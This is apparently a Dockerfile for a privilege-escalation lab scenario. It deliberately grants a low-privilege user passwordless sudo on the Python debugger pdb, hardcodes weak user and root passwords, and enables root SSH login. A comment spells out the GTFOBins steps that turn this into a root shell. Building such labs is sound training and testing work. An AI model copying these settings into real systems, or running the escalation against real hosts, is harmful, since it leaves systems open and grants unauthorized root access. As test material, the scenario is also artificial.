FROM debian:bookworm-slim

# ============================================================
# PrivEscalate Scenario: sudo_pdb
# ATT&CK: T1548.003 | CWE: CWE-269
# Vulnerability: sudo misconfiguration allows running /usr/bin/pdb as root
# ============================================================

ENV DEBIAN_FRONTEND=noninteractive

# Install SSH server, sudo, and python3 (which provides pdb)
RUN apt-get update && \
    apt-get install -y \
        openssh-server \
        sudo \
        python3 \
    && rm -rf /var/lib/apt/lists/* \
    && mkdir -p /run/sshd

# pdb is typically installed as a Python module script; ensure /usr/bin/pdb3 or /usr/bin/pdb exists
# On Debian bookworm, pdb3 is at /usr/bin/pdb3. Create a symlink if /usr/bin/pdb doesn't exist.
RUN if [ ! -f /usr/bin/pdb ]; then ln -s /usr/bin/pdb3 /usr/bin/pdb; fi && \
    ls -la /usr/bin/pdb

# Create low-privilege user
RUN useradd -m -s /bin/bash lowpriv && \
    echo "lowpriv:password123" | chpasswd

# --- Configure sudo vulnerability ---
# pdb (Python Debugger) can be used to escalate privileges when run as root via sudo.
# GTFOBins exploit:
#   TF=$(mktemp)
#   echo 'import os; os.execl("/bin/bash", "bash", "-p")' > $TF
#   sudo pdb $TF
#   Then at the (Pdb) prompt, type: cont
# This drops into a root shell.
RUN echo "lowpriv ALL=(root) NOPASSWD: /usr/bin/pdb" > /etc/sudoers.d/pdb && \
    chmod 440 /etc/sudoers.d/pdb

# Verify sudo configuration
RUN visudo -c

# Keep SUID on sudo
RUN chmod u+s /usr/bin/sudo

# Configure SSH
RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "root:aim8Du7h" | chpasswd

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]